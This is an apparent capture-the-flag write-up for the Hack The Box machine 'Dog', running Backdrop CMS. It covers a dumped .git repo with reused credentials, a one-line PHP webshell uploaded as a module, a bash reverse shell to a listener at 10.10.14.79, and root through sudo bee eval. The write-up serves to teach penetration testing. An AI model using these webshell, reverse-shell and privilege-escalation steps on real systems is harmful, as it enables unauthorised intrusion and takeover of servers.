[HTB: Dog](/2025/07/12/htb-dog.html)

![Dog](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/dog-cover.webp)

Dog presents an instance of Backdrop CMS. I’ll abuse an exposed Git directory on the webserver to access configuration files, finding both a username and a password. Logged into the CMS, I’ll upload a malicious module / plugin to get remote code execution. After pivoting to the next using by a shared password, I’ll find that they are able to run the tool designed for managing Backdrop-CMS, bee, as root. I’ll abuse a command that allows for running arbitrary PHP code to get a shell as root.

## Box Info

[![Dog](/icons/box-dog.webp)](https://hackthebox.com/machines/dog)

[Dog](https://hackthebox.com/machines/dog)

Easy

Retire Date 12 Jul 2025

OS ![Linux](/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for Dog](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/dog-diff.webp)

Radar Graph ![Radar chart for Dog](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/dog-radar.webp)

User

00:18:10 Root

00:23:54 Creator ## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 16:11 EST
Nmap scan report for 10.10.11.58
Host is up (0.088s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 16:12 EST
Nmap scan report for 10.10.11.58
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

Based on the [OpenSSH and Apache versions](about:/cheatsheets/os#ubuntu), the host is likely running Ubuntu 20.04 focal.

There is also a `robots.txt` as well as an exposed `.git` repo!

### Website - TCP 80

#### Site

The site is a blog about dogs:

 ![image-20250219161414876](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219161414876.webp)![expand](/icons/expand.png)

The about page has an email address, `support@dog.htb`:

![image-20250219161656625](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219161656625.webp)

The login page takes username or email:

![image-20250219162226012](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219162226012.webp)

The error message on the password reset tab seems to verify if a username is in use or not:

![image-20250219162249800](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219162249800.webp)

I’m not able to guess a valid one, so I can’t say for sure at this point.

#### Tech Stack

The page footer says that the site is running in [Backdrop CMS](https://backdropcms.org/):

![image-20250219161724166](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219161724166.webp)

The HTTP response headers show this as well, as well as Apache:

```
HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 21:14:03 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Backdrop-Cache: HIT
Etag: "1739999544-gzip"
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Backdrop CMS 1 (https://backdropcms.org)
Cache-Control: public, max-age=300
Last-Modified: Wed, 19 Feb 2025 21:12:24 +0000
Expires: Fri, 16 Jan 2015 07:50:00 GMT
Vary: Cookie,Accept-Encoding
Content-Length: 13332
Content-Range: 0-3638/3639
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
```

Backdrop is a PHP CMS, and loading the main page as `/index.php` works.

The 404 page is the [default Apache 404](about:/cheatsheets/404#apache--httpd):

![image-20250219161839271](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219161839271.webp)

#### Directory Brute Force

Given that I have the `.git` repo, I likely don’t need to enumerate directories with brute force. Still, it’s interesting to see what’s exposed. I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://10.10.11.58 --dont-extract-links -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  \`    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.58
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      312c http://10.10.11.58/modules => http://10.10.11.58/modules/
301      GET        9l       28w      311c http://10.10.11.58/themes => http://10.10.11.58/themes/
301      GET        9l       28w      310c http://10.10.11.58/sites => http://10.10.11.58/sites/
200      GET      201l      761w    13332c http://10.10.11.58/
301      GET        9l       28w      310c http://10.10.11.58/files => http://10.10.11.58/files/
301      GET        9l       28w      309c http://10.10.11.58/core => http://10.10.11.58/core/
200      GET      201l      761w    13332c http://10.10.11.58/index.php
301      GET        9l       28w      312c http://10.10.11.58/layouts => http://10.10.11.58/layouts/
200      GET        0l        0w        0c http://10.10.11.58/settings.php
[####################] - 2m    210000/210000  0s      found:9       errors:0      
[####################] - 2m     30000/30000   285/s   http://10.10.11.58/ 
[####################] - 0s     30000/30000   348837/s http://10.10.11.58/modules/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   340909/s http://10.10.11.58/themes/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   340909/s http://10.10.11.58/sites/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   333333/s http://10.10.11.58/files/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   329670/s http://10.10.11.58/core/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   337079/s http://10.10.11.58/layouts/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
```

This doesn’t find anything I couldn’t get through GitHub, but does help orient that the folders at the root of the [repo](https://github.com/backdrop/backdrop) are available on the webserver:

![image-20250219170132407](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219170132407.webp)

#### Backdrop Version

All the directories without an `index.php` file have listing enabled, and clicking around, I’ll find that the version is available in a `testing.info` file available on the webserver:

```
oxdf@hacky$ curl http://10.10.11.58/core/profiles/testing/testing.info
name = Testing
description = Minimal profile for running tests. Includes absolutely required modules only.
version = BACKDROP_VERSION
backdrop = 1.x
type = profile
hidden = TRUE

dependencies[] = layout

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

It’s version 1.27.1.

### Source Code

#### Download Repo

`nmap` noticed that there was an exposed `.git` repo on the webserver. I’ll grab it with `git-dumper` ([source](https://github.com/arthaud/git-dumper)):

```
oxdf@hacky$ git-dumper http://10.10.11.58/ repo
[-] Testing http://10.10.11.58/.git/HEAD [200]
[-] Testing http://10.10.11.58/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.11.58/.git/ [200]
[-] Fetching http://10.10.11.58/.gitignore [404]
[-] http://10.10.11.58/.gitignore responded with status code 404
[-] Fetching http://10.10.11.58/.git/HEAD [200]
[-] Fetching http://10.10.11.58/.git/config [200]
...[snip]...
```

#### Configuration

There’s a `settings.php` file in the root of the repo. It has database connection information:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

There is a password there, but it doesn’t work for the root user, so I need usernames. It’s reasonable to think they might exist in the `@dog.htb` format. I’ll use `grep` to check for this in the repo anywhere:

```
oxdf@hacky$ grep -r '@dog.htb' .
./.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000  commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

root and dog do not work in the password reset form, but when I enter tiffany, it redirects to the login page with a different error:

![image-20250219175428725](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219175428725.webp)

## Shell as www-data

### CVE False Positives

Searching for this version and CVE returns several references to authenticated RCE and one CVE:

![image-20250219170314989](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219170314989.webp)

[CVE-2024-41709](https://nvd.nist.gov/vuln/detail/CVE-2024-41709) is described as:

> Backdrop CMS before 1.27.3 and 1.28.x before 1.28.2 does not sufficiently sanitize field labels before they are displayed in certain places. This vulnerability is mitigated by the fact that an attacker must have a role with the “administer fields” permission.

That doesn’t seem very interesting. The “exploits” in those search results are not really exploits, but rather a way to upload a plugin with admin access.

### Admin RCE

#### Admin Access

The username tiffany with the password “BackDropJ2024DS2024” works to login to the admin page:

 ![image-20250219175645064](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219175645064.webp)![expand](/icons/expand.png)

With access here, I can follow the same path I took in [CarpeDiem](about:/2022/12/03/htb-carpediem.html#rce-in-backdrop-cms). I’ll want to upload a malicious module via the Functionality –> Install new modules menu:

![image-20250219182915720](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219182915720.webp)

#### Malicious Module

[This repo](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS) described exploiting a different vulnerability in a different version of Backdrop, but it also has a webshell in an extension in the [releases](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS) tab:

![image-20250219183103076](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219183103076.webp)

I’ll download `reference.tar`. If I extract the files from the archive, there’s a `reference` directory:

```
oxdf@hacky$ tar xf reference.tar 
oxdf@hacky$ cd reference/
oxdf@hacky$ ls
LICENSE.txt  README.md  reference.info  reference.install  reference.module  shell.php  tests  views
```

`shell.php` has a simple webshell:

```php
<?php system($_GET['cmd']);?>
```

#### Install Webshell

In the “Install new modules” page, there’s a link at the bottom right for “Manual Installation”:

![image-20250219183156448](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219183156448.webp)

On the next page, I’ll give it `reference.tar` under “Upload a module, theme, or layout archive to install”:

![image-20250219183307546](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219183307546.webp)

The shell will exist at `/modules/[name of module]/shell.php`. The module here is named `reference`:

![image-20250219183635044](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250219183635044.webp)

There’s a cleanup script running fairly quickly, so I’ll need to act fast to use this.

#### Shell

I’ll replace the command with `bash -c 'bash -i >%26 /dev/tcp/10.10.14.79/443 0>%261'`, which is a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) with the `&` url-encoded. On submitting, I get a shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.58 43156
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/reference$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@dog:/var/www/html/modules/reference$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@dog:/var/www/html/modules/reference$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@dog:/var/www/html/modules/reference$
```

## Shell as johnsusack

### Enumeration

There are two users with home directories in `/home`:

```
www-data@dog:/home$ ls   
jobert  johncusack
```

That matches the users with shells configured in `passwd`:

```
www-data@dog:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

### su / SSH

The password from the website config and from logging into the CMS as tiffany works for johncusack as well with `su`:

```
www-data@dog:/$ su - johncusack
Password: 
johncusack@dog:~$
```

And with SSH:

```
oxdf@hacky$ sshpass -p 'BackDropJ2024DS2024' ssh johncusack@10.10.11.58
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-205-generic x86_64)
...[snip]...
johncusack@dog:~$
```

## Shell as root

### Enumeration

johncusack can run `bee` as root with `sudo`:

```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

### bee

#### Commands

`bee` is the [comm-and line utility for Backdrop CMS](https://github.com/backdrop-contrib/bee). Running `bee` prints a help menu with a ton of subcommands:

```
johncusack@dog:~$ bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).

Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.

  config-get
   cget
   Get the value of a specific config option, or view all the config options in a given file.

  config-import
   cim, bcim
   Import config into the site.

  config-set
   cset
   Set the value of an option in a config file.

 CORE
  download-core
   dl-core
   Download Backdrop core.

  install
   si, site-install
   Install Backdrop and setup a new site.

 DATABASE
  db-drop
   sql-drop
   Drop the current database and recreate an empty database with the same details. This could be used prior to import if the target database has more tables than the source database.

  db-export
   dbex, db-dump, sql-export, sql-dump
   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.

  db-import
   dbim, sql-import
   Import an SQL file into the current database.

 INFORMATION
  help
   Provide help and examples for 'bee' and its commands.

  log
   ws, dblog, watchdog-show
   Show database log messages.

  status
   st, info, core-status
   Provides an overview of the current Backdrop installation/site.

  version
   Display the current version of Bee.

 MISCELLANEOUS
  cache-clear
   cc
   Clear a specific cache, or all Backdrop caches.

  cron
   Run cron.

  maintenance-mode
   mm
   Enable or disable maintenance mode for Backdrop.

 PROJECTS
  disable
   dis, pm-disable
   Disable one or more projects (modules, themes, layouts).

  download
   dl, pm-download
   Download Backdrop contrib projects.

  enable
   en, pm-enable
   Enable one or more projects (modules, themes, layouts).

  projects
   pml, pmi, project, pm-list, pm-info
   Display information about available projects (modules, themes, layouts).

  uninstall
   pmu, pm-uninstall
   Uninstall one or more modules.

 ROLES
  permissions
   pls, permissions-list
   List all permissions of the modules.

  role-add-perm
   rap
   Grant specified permission(s) to a role.

  role-create
   rcrt
   Add a role.

  role-delete
   rdel
   Delete a role.

  role-remove-perm
   rrp
   Remove specified permission(s) from a role.

  roles
   rls, roles-list
   List all roles with the permissions.

 STATE
  state-get
   sg, sget
   Get the value of a Backdrop state.

  state-set
   ss, sset
   Set the value of an existing Backdrop state.

 THEMES
  theme-admin
   admin-theme
   Set the admin theme.

  theme-default
   default-theme
   Set the default theme.

 UPDATE
  update-db
   updb, updbst, updatedb, updatedb-status
   Show, and optionally apply, all pending database updates.

 USERS
  user-add-role
   urole, urol
   Add role to user.

  user-block
   ublk
   Block a user.

  user-cancel
   ucan
   Cancel/remove a user.

  user-create
   ucrt
   Create a user account with the specified name.

  user-login
   uli
   Display a login link for a given user.

  user-password
   upw, upwd
   Reset the login password for a given user.

  user-remove-role
   urrole, urrol
   Remove a role from a user.

  user-unblock
   uublk
   Unblock a user.

  users
   uls, user-list
   List all user accounts.

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

One towards the bottom jumps out:

```
eval
 ev, php-eval
 Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

#### Root Directory

Running `eval` shows it needs some code:

```
johncusack@dog:~$ sudo bee eval

 ✘  Argument 'code' is required.
```

Giving it some code still errors:

```
johncusack@dog:~$ sudo bee eval 'echo "hello"'

 ✘  The required bootstrap level for 'eval' is not ready.
```

The same error comes with other commands:

```
johncusack@dog:~$ sudo bee db-query 'show databases'

 ✘  The required bootstrap level for 'db-query' is not ready.
```

This error is not exactly clear, but the issue is that `bee` is meant to be a command line management tool for a Backdrop project. Running `bee status` shows this:

```
johncusack@dog:~$ bee status

 ⚠️  No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option.
```

`/var/www/html` has the web application:

```
johncusack@dog:/var/www/html$ ls
core  files  index.php  layouts  LICENSE.txt  modules  README.md  robots.txt  settings.php  sites  themes
```

Running from that directory works:

```
johncusack@dog:/var/www/html$ sudo bee db-query 'show databases'
backdrop
information_schema
mysql
performance_schema
sys
johncusack@dog:/var/www/html$ sudo bee eval 'echo "hello"'
hello
```

Or, setting `--root` to that dir also works:

```
johncusack@dog:~$ sudo bee status --root=/var/www/html

 Backdrop CMS             1.27.1
 Bee version              1.x-1.x
 Bee root directory       /backdrop_tool/bee
 Site root directory      /var/www/html
 Site type                Single
 Database                 mysql
 Database name            backdrop
 Database username        root
 Database password        **********
 Database host            127.0.0.1
 Database port
 Cron last run            2025-02-07 21:05:34 GMT+0000
 Install time             2024-07-09 18:12:15 GMT+0000
 Update last check        2025-02-07 21:12:04 GMT+0000
 Settings.php path        /var/www/html/settings.php
 Drupal compatibility     on
 Config storage active    /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active  
 Config storage staging   /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging 
 Site name                Dog
 Default theme            basis
 Admin theme              seven
 Public files path        /var/www/html/files
 Temporary files path     /tmp
 Preprocess CSS           on
 Preprocess JS            on
 Theme debug              off
 Error display level      hide
 PHP cli version          7.4.3-4ubuntu2.28
 PHP ini path             /etc/php/7.4/cli/php.ini
```

Annoyingly, using `--root` without an `=` doesn’t work:

```
johncusack@dog:~$ sudo bee status --root /var/www/html

 ✘  1 is not a valid directory.                                                                                                    
 ⚠️  No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option.
```

#### Exploit

With this figured out, I can run PHP code:

```
johncusack@dog:/var/www/html$ sudo bee eval 'system("id")'
uid=0(root) gid=0(root) groups=0(root)
```

Which is easy enough to get a shell as root:

```
johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")'
root@dog:/var/www/html#
```

And the flag:

```
root@dog:~# cat root.txt
77b1553a************************
```
